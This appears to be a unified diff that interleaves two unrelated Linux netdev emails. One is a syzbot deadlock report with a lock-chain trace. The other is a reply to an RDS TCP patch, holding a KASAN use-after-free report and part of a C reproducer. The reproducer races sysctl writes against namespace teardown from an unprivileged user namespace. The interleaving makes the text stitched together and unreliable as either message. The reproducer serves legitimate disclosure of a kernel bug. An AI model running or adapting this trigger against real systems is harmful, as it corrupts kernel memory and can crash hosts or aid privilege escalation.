@@ -1,359 +1,504 @@
-Received: from mail-oi1-f205.google.com (mail-oi1-f205.google.com [209.85.167.205])
+Received: from mail-yx1-f50.google.com (mail-yx1-f50.google.com [74.125.224.50])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id F1DC41E260C
-	for <netdev@vger.kernel.org>; Sun, 19 Jul 2026 20:18:28 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.167.205
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 36FF32EA47C
+	for <netdev@vger.kernel.org>; Sun, 19 Jul 2026 20:37:20 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.224.50
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1784492310; cv=none; b=QZjt33FqhjXoU4Fy4BL0TmkzDrHV3+y4krEV+6XWFft2PXSKPSPFkmiQvjWwowPfI7tXiIXWW1JNCYnATjZEanTnloGVCdDL1vmJmGpQdf1WZw00BosKjcxiC+pc9W1CuLqcS6krLYErdwa6x4bxFAWDDoyzcCkSD6VJ23L/kJk=
+	t=1784493441; cv=none; b=Rl7wOpv7dJ22CyidOeW9fiLXD27olb6ZJku1h6+CfEaTXgbPCpyj2qDKGmRibfL41tCrDMJNx5ZD5dLiaHTTT/E3UoWUUyIOj1ycRaWkyzloRw8x620K0q/fKtgCJVy1UXfuIqqVv4tuI3R0PAmXV2JqvjK8jKFE7YNegolp8Ac=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1784492310; c=relaxed/simple;
-	bh=6t7vWTVRCqJZgpzyZLm0OZQ+0CsBlfh9aDGfDxDNAF0=;
-	h=MIME-Version:Date:Message-ID:Subject:From:To:Content-Type; b=tQODZa4Rd1X5x8JlezldcfzJVa5NuVTxPGF0hOz4n6QusHTwLHcX2h3bg6k4eZ9WhdKgYwAuJ7nP3OtDC6oHxq7GH2J0dk+ZMVdf5OWM8PcJuSdBclAdZrDoaT0xl++GFrVPdXBkaIl3mJONev3R0f/DPjtFI496wkB4wzdq094=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=fail (p=none dis=none) header.from=syzkaller.appspotmail.com; spf=pass smtp.mailfrom=M3KW2WVRGUFZ5GODRSRYTGD7.apphosting.bounces.google.com; arc=none smtp.client-ip=209.85.167.205
-Authentication-Results: smtp.subspace.kernel.org; dmarc=fail (p=none dis=none) header.from=syzkaller.appspotmail.com
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=M3KW2WVRGUFZ5GODRSRYTGD7.apphosting.bounces.google.com
-Received: by mail-oi1-f205.google.com with SMTP id 5614622812f47-48e2ce64834so11322868b6e.3
-        for <netdev@vger.kernel.org>; Sun, 19 Jul 2026 13:18:28 -0700 (PDT)
+	s=arc-20240116; t=1784493441; c=relaxed/simple;
+	bh=zlXTcdm1Eobmx/ABw/l8X4K1cugckTh+Me9W8v0l8Rc=;
+	h=From:To:Cc:Subject:Date:Message-ID:In-Reply-To:References:
+	 MIME-Version; b=Z+zyqUeOiNefbC0J5CNSCLF2eW8UZ8SZbRFyAeUoybnp6qL3uQ01A+iwTSEVPWpeUVV1/+WO2RfbToKWB7pW4chMtqFiaD3MD6VzGtBtfNudJ04+yWHv/hJbiLgGvtVzqMwjekIFrTT4DNbqCCjAffrFVZUFps4lg270I/LrIOg=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=Kp1XkEv+; arc=none smtp.client-ip=74.125.224.50
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
+Authentication-Results: smtp.subspace.kernel.org;
+	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="Kp1XkEv+"
+Received: by mail-yx1-f50.google.com with SMTP id 956f58d0204a3-668296d0ff3so4019658d50.0
+        for <netdev@vger.kernel.org>; Sun, 19 Jul 2026 13:37:20 -0700 (PDT)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20251104; t=1784493439; x=1785098239; darn=vger.kernel.org;
+        h=content-transfer-encoding:mime-version:references:in-reply-to
+         :message-id:date:subject:cc:to:from:from:to:cc:subject:date
+         :message-id:reply-to:content-type;
+        bh=41Rd+yUmrzI8ozU6x6qNA9ggJjoHwdWXcunZ4xwS5wM=;
+        b=Kp1XkEv+ziRHf7kAvu2+PzlhNVEVGukjs6sfrOj+DqtBOje7EAbF3hgFjXkXBSGBxo
+         tKyTEwzbs73t5VQLkr4AV0eq+hYd1RHCMXs4zeMLpdG9Yd3/ORZTzO7AZscZcWa9jK6+
+         q6uzKsgihurf004rmFufrsaNMDWnA4N3zsBtkRMnd/Ucj0Udq17w7uEoZIY9fz9dESle
+         pJ7ERJLzhHc4vF2jKSrYweotEkGXHXHQTWSzhrnFwmIy81z5xt8XKTakDBHk2HUU6SId
+         SrxhkGXoxQqVYnicj77f2VM3QlK277lEmC/svnR3ZX7SUs6iSVBwNK7exGkg2IQpXikq
+         0KZw==
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20251104; t=1784492308; x=1785097108;
-        h=content-type:to:from:subject:message-id:date:mime-version
-         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to
-         :content-type;
-        bh=7T1XGPTxjyOXm2x1yxEIZsJaIZKP9ZUCrWvngzfM/mo=;
-        b=OnMk/elBW59T0u69HCF27kf5kUUjuH+G9SiVDkCuT7kxQ5FoDBvSJ1WCZP9zjARhKX
-         RTny0BWZl7aPhyURfSFe4qaaOA0QCKqAjQHkK3aeJNfTliT71lUPCuydMRk2GHyse0ql
-         o19Il69tEydptSCex8PBC/1yPyQYx0RW4vyhQdUiySDRSg7UtyRkXtVqwk3nxyLIK47j
-         Py7GDpn+gONUOAROesKsl/75ydtYusHXXH9MlgnrYA64Mr7BFNcYsz9Pe0jr2trk/OMN
-         llaf7Ihzy69tvvB12OngRY+hy2Lds07c0ogslBZNHD4J58agdgYZIRkKIEzEcuC3oYOq
-         aprA==
-X-Forwarded-Encrypted: i=1; AHgh+RoJ0faiDhSsbXF1+cjCwVsKE0jSXbkwZwkvBKPxsLbeCSYZbUq6w0Zi4uiEweLiU+b51gI1pqk=@vger.kernel.org
-X-Gm-Message-State: AOJu0Ywqq9bxGOJLViLTn9ii3I9uqk4akf6ZmoKEIb9uSR6qf8JDvDZx
-	8e/j0IMXSXLV7AbvHkMH3yEWZKnNkQJ+FkpumHxcm9nXEWG0NtCdt1yet7VU3FgUZ7eVefsUH0L
-	QPQtHnV37qS19p7yHOZ70KLfdO+VCzkSlhzLMjeXM8gBz6+OGjOKPXkTwX90=
+        d=1e100.net; s=20251104; t=1784493439; x=1785098239;
+        h=content-transfer-encoding:mime-version:references:in-reply-to
+         :message-id:date:subject:cc:to:from:x-gm-gg:x-gm-message-state:from
+         :to:cc:subject:date:message-id:reply-to:content-type;
+        bh=41Rd+yUmrzI8ozU6x6qNA9ggJjoHwdWXcunZ4xwS5wM=;
+        b=haVyfXFy6gZBVEAJDdB7CS4UAObUZAKzSu8TAQ4gMVJV+eRIXeH86hVrv2me+dYVpH
+         qHB+4I7Hi0JOwmbNjlCqSUoBNudDe5A6VAZQRxgro8CzG3X/eNxrhr/SmO4aTvI9tIiN
+         xyUXRZsRE4PeSXhoNLcn+GZVQckGvbbZpzeBcHDkWjw4mcaVwIwv1wIJfMi5lBtdE7n4
+         ZwanmaV+KvPQZMs47+vp/dd4Wx2hIqE1Z+8UQC82Sy0huryQIVq8C+LQAuTfTNALNTFR
+         knaSP9gmQHCOd+qL2wqYPZ7uKLEMm12+hDD162nf4tLoFg2wsCc9luF+kEz9WxSFcnv4
+         iblg==
+X-Forwarded-Encrypted: i=1; AHgh+RpW5ANHOMaQkhDz29VqsD2RBUye1rLObUWdBanEIVF3Zv7QyNY1glAy/+Txj96dgF9cOMjrzzk=@vger.kernel.org
+X-Gm-Message-State: AOJu0Yw+HR3R38S5LFTGpI1jcSgPgBbKth91B4pR5nhMVNFdagQPFMYw
+	uUMyCAKko940ui5e5r7JwIiSMieqPdDAQphtaJUC2AbIH/uNFwcpAH0S
+X-Gm-Gg: AfdE7clzO5T0iMopJ8/K8ZVW0oUNPycF+RcJyGWnojWhgxxp7aJu5nvJP8FpYM9fo6X
+	KVPigYpux6vlbBaT0WTT173gtXyuNSxaM3X0aDmx0BIW4/t/kJ399EGC73KDEovyAbobMZAl4aC
+	I7BZcWnUNM+TGGm1xsiW23Kzqk1de9AAhR1liu7XNunE0yck+AwggKsCw5nWCrA0QiY0Se0797/
+	t54UQDB7MnQZTmtGOSy6QyaNR82sD1JYhUG+JNT7/9ML8WugT7omnXg5HSm26uC0sExMX91NSrG
+	8cXFeiVzlE6ZKZqWH0A2ipYoTpKGCBPekM7lb6ezktRjOMn2lVeKwNKxEt7iReWsPlJWVyxwUEo
+	V+DfTG/n1aTtZYNgASYgcKYYo8ZbL8qW4oLTJsMh+e280o6hFtNuoV6LHV3YZtdlLPUFdBfpV8G
+	rq8EAY9GtijTNPdnpi/lWBMXAbfoTg7QugYhxdmGCI+hLOfln+/NV6geTF/AoriStZTWy6fRSc3
+	QuSYZVHnyacFA==
+X-Received: by 2002:a05:690c:b98:b0:80b:ad04:aaf5 with SMTP id 00721157ae682-81ef26481b3mr39139707b3.51.1784493438939;
+        Sun, 19 Jul 2026 13:37:18 -0700 (PDT)
+Received: from LAPTOP-83ECOPAB.f7a5e5c3-cab1-4810-bdbb-207cdd06de9e.globalsecureaccess.local ([136.55.173.105])
+        by smtp.gmail.com with ESMTPSA id 00721157ae682-81ef4033935sm43461277b3.11.2026.07.19.13.37.18
+        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
+        Sun, 19 Jul 2026 13:37:18 -0700 (PDT)
+From: "Cen Zhang (Microsoft)" <blbllhy@gmail.com>
+To: achender@kernel.org
+Cc: AutonomousCodeSecurity@microsoft.com,
+	blbllhy@gmail.com,
+	davem@davemloft.net,
+	edumazet@google.com,
+	horms@kernel.org,
+	kuba@kernel.org,
+	kys@microsoft.com,
+	linux-kernel@vger.kernel.org,
+	linux-rdma@vger.kernel.org,
+	netdev@vger.kernel.org,
+	pabeni@redhat.com,
+	rds-devel@oss.oracle.com,
+	tgopinath@linux.microsoft.com
+Subject: Re: [PATCH net] rds: tcp: unregister sysctl before tearing down listen socket
+Date: Sun, 19 Jul 2026 16:37:18 -0400
+Message-ID: <20260719203718.9680-1-blbllhy@gmail.com>
+X-Mailer: git-send-email 2.53.0
+In-Reply-To: <ae36eabfd58a08a340be7a988af6edaba9dd683a.camel@kernel.org>
+References: <ae36eabfd58a08a340be7a988af6edaba9dd683a.camel@kernel.org>
 Precedence: bulk
 X-Mailing-List: netdev@vger.kernel.org
 List-Id: <netdev.vger.kernel.org>
 List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-X-Received: by 2002:a05:6808:1910:b0:479:f7e7:4a81 with SMTP id
- 5614622812f47-4a4d00499edmr7991367b6e.0.1784492308033; Sun, 19 Jul 2026
- 13:18:28 -0700 (PDT)
-Date: Sun, 19 Jul 2026 13:18:28 -0700
-X-Google-Appengine-App-Id: s~syzkaller
-X-Google-Appengine-App-Id-Alias: syzkaller
-Message-ID: <6a5d3114.42649fcc.6186.007b.GAE@google.com>
-Subject: [syzbot] [pm?] possible deadlock in device_move (2)
-From: syzbot <syzbot+fe46941938f79773c2f2@syzkaller.appspotmail.com>
-To: dakr@kernel.org, driver-core@lists.linux.dev, gregkh@linuxfoundation.org, 
-	lenb@kernel.org, linux-kernel@vger.kernel.org, linux-pm@vger.kernel.org, 
-	netdev@vger.kernel.org, pavel@kernel.org, rafael@kernel.org, 
-	syzkaller-bugs@googlegroups.com
-Content-Type: text/plain; charset="UTF-8"
+Content-Transfer-Encoding: 8bit
 
-Hello,
+Here is the observed KASAN report and the reproducer used to trigger it.
 
-syzbot found the following issue on:
+KASAN report:
 
-HEAD commit:    3f1f75536668 net: openvswitch: reject oversized nested act..
-git tree:       net
-console output: https://syzkaller.appspot.com/x/log.txt?x=11f98789580000
-kernel config:  https://syzkaller.appspot.com/x/.config?x=5c4196ba0e33631d
-dashboard link: https://syzkaller.appspot.com/bug?extid=fe46941938f79773c2f2
-compiler:       Debian clang version 22.1.8 (++20260613092233+e80beda6e255-1~exp1~20260613092250.77), Debian LLD 22.1.8
+```
+[   23.409360] ==================================================================
+[   23.410774] BUG: KASAN: slab-use-after-free in rds_tcp_skbuf_handler+0x2aa/0x2e0
+[   23.412207] Read of size 8 at addr ffff88800de20ab0 by task exploit/959
+[   23.413472] 
+[   23.413814] CPU: 1 UID: 1000 PID: 959 Comm: exploit Not tainted 7.2.0-rc3+ #1 PREEMPTLAZY 
+[   23.413833] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
+[   23.413844] Call Trace:
+[   23.413849]  <TASK>
+[   23.413855]  dump_stack_lvl+0x8c/0xb0
+[   23.413876]  print_report+0xce/0x630
+[   23.413913]  ? __pfx__raw_spin_lock_irqsave+0x10/0x10
+[   23.413932]  ? irqentry_exit+0x163/0x7b0
+[   23.413956]  ? rds_tcp_skbuf_handler+0x2aa/0x2e0
+[   23.413974]  kasan_report+0xce/0x100
+[   23.414000]  ? rds_tcp_skbuf_handler+0x2aa/0x2e0
+[   23.414021]  rds_tcp_skbuf_handler+0x2aa/0x2e0
+[   23.414041]  proc_sys_call_handler+0x4d7/0x710
+[   23.414060]  ? __pfx_proc_sys_call_handler+0x10/0x10
+[   23.414077]  ? srso_return_thunk+0x5/0x5f
+[   23.414103]  ? security_file_permission+0xb2/0x1b0
+[   23.414130]  ? srso_return_thunk+0x5/0x5f
+[   23.414155]  ? rw_verify_area+0xa0/0x4c0
+[   23.414172]  vfs_write+0x644/0xca0
+[   23.414193]  ? __pfx_proc_sys_write+0x10/0x10
+[   23.414210]  ? __pfx_vfs_write+0x10/0x10
+[   23.414238]  __x64_sys_pwrite64+0x1be/0x220
+[   23.414261]  ? __pfx___x64_sys_pwrite64+0x10/0x10
+[   23.414283]  ? srso_return_thunk+0x5/0x5f
+[   23.414308]  ? restore_fpregs_from_fpstate+0x46/0xd0
+[   23.414333]  do_syscall_64+0xde/0x570
+[   23.414353]  entry_SYSCALL_64_after_hwframe+0x76/0x7e
+[   23.414370] RIP: 0033:0x41e1fd
+[   23.414381] Code: b3 66 2e 0f 1f 84 00 00 00 00 00 66 90 f3 0f 1e fa 48 89 f8 48 89 f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 24 08 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 c7 c1 c0 ff ff ff f7 d8 64 89 01 48
+[   23.414412] RSP: 002b:00007ffef5d0e078 EFLAGS: 00000246 ORIG_RAX: 0000000000000012
+[   23.414428] RAX: ffffffffffffffda RBX: 00000000004880f2 RCX: 000000000041e1fd
+[   23.414439] RDX: 0000000000000008 RSI: 00000000004880f2 RDI: 0000000000000004
+[   23.414448] RBP: 0000000000000004 R08: 0000000015791fc0 R09: 0000000015791fc0
+[   23.414458] R10: 0000000000000000 R11: 0000000000000246 R12: 00000000ffffffff
+[   23.414468] R13: 0000000015792b30 R14: 0000000000000010 R15: 0000000015792b30
+[   23.414483]  </TASK>
+[   23.414488] 
+[   23.451099] Allocated by task 947:
+[   23.452185] 
+[   23.452528] Freed by task 949:
+[   23.453368] 
+[   23.453714] Last potentially related work creation:
+[   23.454847] 
+[   23.455184] Second to last potentially related work creation:
+[   23.456735] 
+[   23.457071] The buggy address belongs to the object at ffff88800de20a80
+[   23.457071]  which belongs to the cache TCPv6 of size 2560
+[   23.459313] The buggy address is located 48 bytes inside of
+[   23.459313]  freed 2560-byte region [ffff88800de20a80, ffff88800de21480)
+[   23.461621] 
+[   23.461962] The buggy address belongs to the physical page:
+[   23.463215] 
+[   23.463560] Memory state around the buggy address:
+[   23.464503]  ffff88800de20980: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
+[   23.465893]  ffff88800de20a00: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
+[   23.467284] >ffff88800de20a80: fa fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
+[   23.468678]                                      ^
+[   23.469623]  ffff88800de20b00: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
+[   23.471021]  ffff88800de20b80: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
+[   23.472413] ==================================================================
+```
 
-Unfortunately, I don't have any reproducer for this issue yet.
+Reproducer code:
 
-Downloadable assets:
-disk image: https://storage.googleapis.com/syzbot-assets/38c0534858bd/disk-3f1f7553.raw.xz
-vmlinux: https://storage.googleapis.com/syzbot-assets/3140a6e2252d/vmlinux-3f1f7553.xz
-kernel image: https://storage.googleapis.com/syzbot-assets/f8a7156a6da0/bzImage-3f1f7553.xz
+```
+/*
+ * Controlled RDS TCP sysctl/netns teardown race reproducer.
+ *
+ * Mental model:
+ *
+ *   target netns child:
+ *     creates the target netns, initializes RDS TCP, opens the target sysctl fd,
+ *     sends that fd to the parent, then waits.  While it waits, the target
+ *     netns and its rtn->rds_tcp_listen_sock are alive.
+ *
+ *   writer children:
+ *     wait on a parent-controlled start barrier, then tight-loop pwrite64()
+ *     the target sysctl fd.  Each pwrite enters rds_tcp_skbuf_handler().
+ *
+ *   parent:
+ *     starts writers first, then releases the target child.  The child exits,
+ *     making the target netns tear down while writers are still in/around the
+ *     sysctl handler.
+ *
+ * Trigger condition:
+ *
+ *   writer has entered rds_tcp_skbuf_handler() and is using
+ *   rtn->rds_tcp_listen_sock while target netns teardown runs:
+ *
+ *     rds_tcp_exit_net()
+ *       -> rds_tcp_kill_sock()
+ *            -> rds_tcp_listen_stop()
+ *                 -> sock_release(rtn->rds_tcp_listen_sock)
+ *
+ * On a vulnerable KASAN kernel this reports a UAF in rds_tcp_skbuf_handler().
+ */
+#define _GNU_SOURCE
+#include <errno.h>
+#include <fcntl.h>
+#include <sched.h>
+#include <signal.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/socket.h>
+#include <sys/syscall.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <unistd.h>
 
-IMPORTANT: if you fix the issue, please add the following tag to the commit:
-Reported-by: syzbot+fe46941938f79773c2f2@syzkaller.appspotmail.com
+#ifndef AF_RDS
+#define AF_RDS 21
+#endif
 
-======================================================
-WARNING: possible circular locking dependency detected
-syzkaller #0 Not tainted
-------------------------------------------------------
-kworker/u9:1/4940 is trying to acquire lock:
-ffffffff8ec848a0 (fs_reclaim){+.+.}-{0:0}, at: might_alloc include/linux/sched/mm.h:317 [inline]
-ffffffff8ec848a0 (fs_reclaim){+.+.}-{0:0}, at: slab_pre_alloc_hook mm/slub.c:4565 [inline]
-ffffffff8ec848a0 (fs_reclaim){+.+.}-{0:0}, at: slab_alloc_node mm/slub.c:4925 [inline]
-ffffffff8ec848a0 (fs_reclaim){+.+.}-{0:0}, at: __do_kmalloc_node mm/slub.c:5361 [inline]
-ffffffff8ec848a0 (fs_reclaim){+.+.}-{0:0}, at: __kmalloc_noprof+0xbc/0x720 mm/slub.c:5387
+#define RDS_TCP_SNDBUF_SYSCTL "/proc/sys/net/rds/tcp/rds_tcp_sndbuf"
+#define SYSCTL_VALUE "1048576\n"
 
-but task is already holding lock:
-ffffffff8f5f5880 (dpm_list_mtx){+.+.}-{4:4}, at: device_move+0x3c/0x720 drivers/base/core.c:4678
+#define DEFAULT_ROUNDS 1000
+#define DEFAULT_WRITERS 16
+#define DEFAULT_PRE_TEARDOWN_US 1000
+#define DEFAULT_POST_TEARDOWN_US 200000
 
-which lock already depends on the new lock.
+struct run_config {
+	int rounds;
+	int writers;
+	int pre_teardown_us;
+	int post_teardown_us;
+	int writer_cpu;
+};
 
+static void die(const char *msg)
+{
+	perror(msg);
+	exit(1);
+}
 
-the existing dependency chain (in reverse order) is:
+static void checked_write_file(const char *path, const char *s)
+{
+	int fd = open(path, O_WRONLY | O_CLOEXEC);
 
--> #8 (dpm_list_mtx){+.+.}-{4:4}:
-       __mutex_lock_common kernel/locking/mutex.c:646 [inline]
-       __mutex_lock+0x19d/0x1550 kernel/locking/mutex.c:821
-       device_pm_add+0x7d/0x350 drivers/base/power/main.c:153
-       device_add+0x4eb/0xb80 drivers/base/core.c:3720
-       device_create_groups_vargs drivers/base/core.c:4454 [inline]
-       device_create+0x269/0x300 drivers/base/core.c:4493
-       msr_device_create+0x33/0x50 arch/x86/kernel/msr.c:251
-       cpuhp_invoke_callback+0x434/0x810 kernel/cpu.c:194
-       cpuhp_thread_fun+0x362/0x780 kernel/cpu.c:1109
-       smpboot_thread_fn+0x57c/0xa80 kernel/smpboot.c:160
-       kthread+0x388/0x470 kernel/kthread.c:436
-       ret_from_fork+0x514/0xb70 arch/x86/kernel/process.c:158
-       ret_from_fork_asm+0x1a/0x30 arch/x86/entry/entry_64.S:245
+	if (fd < 0)
+		die(path);
+	if (write(fd, s, strlen(s)) != (ssize_t)strlen(s))
+		die(path);
+	close(fd);
+}
 
--> #7 (cpuhp_state-up){+.+.}-{0:0}:
-       cpuhp_lock_acquire kernel/cpu.c:103 [inline]
-       cpuhp_thread_fun+0x127/0x780 kernel/cpu.c:1086
-       smpboot_thread_fn+0x57c/0xa80 kernel/smpboot.c:160
-       kthread+0x388/0x470 kernel/kthread.c:436
-       ret_from_fork+0x514/0xb70 arch/x86/kernel/process.c:158
-       ret_from_fork_asm+0x1a/0x30 arch/x86/entry/entry_64.S:245
+static void become_root_in_new_userns(void)
+{
+	char map[128];
+	uid_t uid = getuid();
+	gid_t gid = getgid();
 
--> #6 (cpu_hotplug_lock){++++}-{0:0}:
-       percpu_down_read_internal include/linux/percpu-rwsem.h:53 [inline]
-       percpu_down_read include/linux/percpu-rwsem.h:77 [inline]
-       cpus_read_lock+0x42/0x160 kernel/cpu.c:490
-       static_key_slow_inc+0x12/0x30 kernel/jump_label.c:190
-       nbd_reconnect_socket drivers/block/nbd.c:1379 [inline]
-       nbd_genl_reconfigure+0x1301/0x1e80 drivers/block/nbd.c:2468
-       genl_family_rcv_msg_doit+0x233/0x340 net/netlink/genetlink.c:1114
-       genl_family_rcv_msg net/netlink/genetlink.c:1194 [inline]
-       genl_rcv_msg+0x614/0x7a0 net/netlink/genetlink.c:1209
-       netlink_rcv_skb+0x226/0x4a0 net/netlink/af_netlink.c:2556
-       genl_rcv+0x28/0x40 net/netlink/genetlink.c:1218
-       netlink_unicast_kernel net/netlink/af_netlink.c:1319 [inline]
-       netlink_unicast+0x7bb/0x940 net/netlink/af_netlink.c:1345
-       netlink_sendmsg+0x813/0xb40 net/netlink/af_netlink.c:1900
-       sock_sendmsg_nosec+0x13a/0x180 net/socket.c:775
-       __sock_sendmsg net/socket.c:790 [inline]
-       ____sys_sendmsg+0x54e/0x850 net/socket.c:2684
-       ___sys_sendmsg+0x2a5/0x360 net/socket.c:2738
-       __sys_sendmsg net/socket.c:2770 [inline]
-       __do_sys_sendmsg net/socket.c:2775 [inline]
-       __se_sys_sendmsg net/socket.c:2773 [inline]
-       __x64_sys_sendmsg+0x1b1/0x290 net/socket.c:2773
-       do_syscall_x64 arch/x86/entry/syscall_64.c:63 [inline]
-       do_syscall_64+0x174/0x580 arch/x86/entry/syscall_64.c:94
-       entry_SYSCALL_64_after_hwframe+0x77/0x7f
+	if (unshare(CLONE_NEWUSER))
+		die("unshare(CLONE_NEWUSER)");
 
--> #5 (&nsock->tx_lock){+.+.}-{4:4}:
-       __mutex_lock_common kernel/locking/mutex.c:646 [inline]
-       __mutex_lock+0x19d/0x1550 kernel/locking/mutex.c:821
-       nbd_handle_cmd drivers/block/nbd.c:1143 [inline]
-       nbd_queue_rq+0x373/0x1150 drivers/block/nbd.c:1207
-       blk_mq_dispatch_rq_list+0x499/0x1990 block/blk-mq.c:2117
-       __blk_mq_do_dispatch_sched block/blk-mq-sched.c:168 [inline]
-       blk_mq_do_dispatch_sched block/blk-mq-sched.c:182 [inline]
-       __blk_mq_sched_dispatch_requests+0xd36/0x1580 block/blk-mq-sched.c:307
-       blk_mq_sched_dispatch_requests+0xd7/0x190 block/blk-mq-sched.c:329
-       blk_mq_run_work_fn+0x16c/0x300 block/blk-mq.c:2532
-       process_one_work kernel/workqueue.c:3322 [inline]
-       process_scheduled_works+0xa8e/0x14e0 kernel/workqueue.c:3405
-       worker_thread+0xa47/0xfb0 kernel/workqueue.c:3486
-       kthread+0x388/0x470 kernel/kthread.c:436
-       ret_from_fork+0x514/0xb70 arch/x86/kernel/process.c:158
-       ret_from_fork_asm+0x1a/0x30 arch/x86/entry/entry_64.S:245
+	snprintf(map, sizeof(map), "0 %u 1\n", uid);
+	checked_write_file("/proc/self/uid_map", map);
+	checked_write_file("/proc/self/setgroups", "deny\n");
+	snprintf(map, sizeof(map), "0 %u 1\n", gid);
+	checked_write_file("/proc/self/gid_map", map);
+}
 
--> #4 (&cmd->lock){+.+.}-{4:4}:
-       __mutex_lock_common kernel/locking/mutex.c:646 [inline]
-       __mutex_lock+0x19d/0x1550 kernel/locking/mutex.c:821
-       nbd_queue_rq+0xc1/0x1150 drivers/block/nbd.c:1199
-       blk_mq_dispatch_rq_list+0x499/0x1990 block/blk-mq.c:2117
-       __blk_mq_do_dispatch_sched block/blk-mq-sched.c:168 [inline]
-       blk_mq_do_dispatch_sched block/blk-mq-sched.c:182 [inline]
-       __blk_mq_sched_dispatch_requests+0xd36/0x1580 block/blk-mq-sched.c:307
-       blk_mq_sched_dispatch_requests+0xd7/0x190 block/blk-mq-sched.c:329
-       blk_mq_run_work_fn+0x16c/0x300 block/blk-mq.c:2532
-       process_one_work kernel/workqueue.c:3322 [inline]
-       process_scheduled_works+0xa8e/0x14e0 kernel/workqueue.c:3405
-       worker_thread+0xa47/0xfb0 kernel/workqueue.c:3486
-       kthread+0x388/0x470 kernel/kthread.c:436
-       ret_from_fork+0x514/0xb70 arch/x86/kernel/process.c:158
-       ret_from_fork_asm+0x1a/0x30 arch/x86/entry/entry_64.S:245
+static void touch_rds_tcp_transport(void)
+{
+	int fd = socket(AF_RDS, SOCK_SEQPACKET, 0);
 
--> #3 (set->srcu){.+.+}-{0:0}:
-       srcu_lock_sync include/linux/srcu.h:199 [inline]
-       __synchronize_srcu+0xc9/0x2f0 kernel/rcu/srcutree.c:1481
-       elevator_switch+0x1e8/0x7b0 block/elevator.c:576
-       elevator_change+0x2fa/0x480 block/elevator.c:681
-       elevator_set_default+0x375/0x440 block/elevator.c:754
-       blk_register_queue+0x3f3/0x4e0 block/blk-sysfs.c:992
-       __add_disk+0x6cb/0xe30 block/genhd.c:528
-       add_disk_fwnode+0xfb/0x4b0 block/genhd.c:597
-       add_disk include/linux/blkdev.h:800 [inline]
-       nbd_dev_add+0x733/0xb60 drivers/block/nbd.c:2021
-       nbd_init+0x15f/0x1e0 drivers/block/nbd.c:2729
-       do_one_initcall+0x250/0x870 init/main.c:1347
-       do_initcall_level+0x10a/0x1a0 init/main.c:1409
-       do_initcalls+0x59/0xa0 init/main.c:1425
-       kernel_init_freeable+0x29d/0x3e0 init/main.c:1658
-       kernel_init+0x1d/0x1d0 init/main.c:1548
-       ret_from_fork+0x514/0xb70 arch/x86/kernel/process.c:158
-       ret_from_fork_asm+0x1a/0x30 arch/x86/entry/entry_64.S:245
+	if (fd >= 0)
+		close(fd);
+}
 
--> #2 (&q->elevator_lock){+.+.}-{4:4}:
-       __mutex_lock_common kernel/locking/mutex.c:646 [inline]
-       __mutex_lock+0x19d/0x1550 kernel/locking/mutex.c:821
-       elevator_change+0x1af/0x480 block/elevator.c:679
-       elevator_set_none+0xb5/0x140 block/elevator.c:769
-       blk_mq_elv_switch_none block/blk-mq.c:5101 [inline]
-       __blk_mq_update_nr_hw_queues block/blk-mq.c:5146 [inline]
-       blk_mq_update_nr_hw_queues+0x5ef/0x19f0 block/blk-mq.c:5211
-       nbd_start_device+0x189/0xb30 drivers/block/nbd.c:1526
-       nbd_genl_connect+0x1597/0x1c10 drivers/block/nbd.c:2276
-       genl_family_rcv_msg_doit+0x233/0x340 net/netlink/genetlink.c:1114
-       genl_family_rcv_msg net/netlink/genetlink.c:1194 [inline]
-       genl_rcv_msg+0x614/0x7a0 net/netlink/genetlink.c:1209
-       netlink_rcv_skb+0x226/0x4a0 net/netlink/af_netlink.c:2556
-       genl_rcv+0x28/0x40 net/netlink/genetlink.c:1218
-       netlink_unicast_kernel net/netlink/af_netlink.c:1319 [inline]
-       netlink_unicast+0x7bb/0x940 net/netlink/af_netlink.c:1345
-       netlink_sendmsg+0x813/0xb40 net/netlink/af_netlink.c:1900
-       sock_sendmsg_nosec+0x13a/0x180 net/socket.c:775
-       __sock_sendmsg net/socket.c:790 [inline]
-       ____sys_sendmsg+0x54e/0x850 net/socket.c:2684
-       ___sys_sendmsg+0x2a5/0x360 net/socket.c:2738
-       __sys_sendmsg net/socket.c:2770 [inline]
-       __do_sys_sendmsg net/socket.c:2775 [inline]
